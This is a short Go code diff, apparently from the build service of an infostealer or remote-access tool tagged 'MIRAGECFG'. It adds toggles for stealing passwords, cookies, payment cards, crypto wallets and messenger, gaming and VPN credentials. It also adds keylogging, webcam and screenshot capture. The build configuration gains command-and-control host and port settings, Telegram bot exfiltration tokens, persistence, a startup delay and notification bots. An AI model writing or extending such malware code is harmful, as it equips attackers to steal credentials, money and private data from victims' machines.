@@ -16,16 +16,33 @@ import (
 
 const configSignature = "MIRAGECFG"
 
+type Modules struct {
+	Passwords  bool `json:"passwords"`
+	Cookies    bool `json:"cookies"`
+	Cards      bool `json:"cards"`
+	Wallets    bool `json:"wallets"`
+	Messengers bool `json:"messengers"`
+	Gaming     bool `json:"gaming"`
+	Vpn        bool `json:"vpn"`
+	Keylogger  bool `json:"keylogger"`
+	Webcam     bool `json:"webcam"`
+	Screenshot bool `json:"screenshot"`
+}
+
 type BuildConfig struct {
-	C2Host            string `json:"c2_host"`
-	C2Port            int    `json:"c2_port"`
-	TelegramToken     string `json:"telegram_token"`
-	TelegramChatID    string `json:"telegram_chat_id"`
-	EnablePersistence bool   `json:"enable_persistence"`
-	EnableScreenshot  bool   `json:"enable_screenshot"`
-	EnableGrabber     bool   `json:"enable_grabber"`
-	IncludeDecryptor  bool   `json:"include_decryptor"`
-	BuildTag          string `json:"build_tag"`
+	C2Host            string   `json:"c2_host"`
+	C2Port            int      `json:"c2_port"`
+	TelegramToken     string   `json:"telegram_token"`
+	TelegramChatID    string   `json:"telegram_chat_id"`
+	EnablePersistence bool     `json:"enable_persistence"`
+	EnableScreenshot  bool     `json:"enable_screenshot"`
+	EnableGrabber     bool     `json:"enable_grabber"`
+	IncludeDecryptor  bool     `json:"include_decryptor"`
+	BuildTag          string   `json:"build_tag"`
+	StartupDelayMs    int      `json:"startup_delay_ms"`
+	DomainDetect      []string `json:"domain_detect"`
+	Modules           Modules  `json:"modules"`
+	NotifyBots        []string `json:"notify_bots"`
 }
 
 type BuildService struct{}
